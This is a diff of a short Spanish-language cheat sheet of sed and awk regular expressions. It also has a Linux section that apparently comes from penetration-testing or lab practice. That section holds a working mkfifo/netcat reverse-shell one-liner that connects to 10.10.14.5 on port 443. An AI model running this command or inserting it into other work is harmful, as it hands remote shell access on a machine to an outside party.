@@ -1,6 +1,6 @@
-'a## Expresion regulares 
+## Expresion regulares 
 **Expresion regular para añadir texto antes de cada oracion:** ``sed -E 's/^(.*)/Texto a añadir \1/g;s/\r//'``
-**Expresion regular para eliminar espacios en blanco de un texto:** `'/^\s*$/d'`
+**Expresion regular para eliminar espacios en blanco de un texto:** `'/^\s*$/d`
 **Expresion regular para filtrar por rangos con awk**: `awk "/' -/,/:cannot open/" `
 ## Linux
 **Reverse Shell; MKFIFO**: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 10.10.14.5 443 >/tmp/f;*`
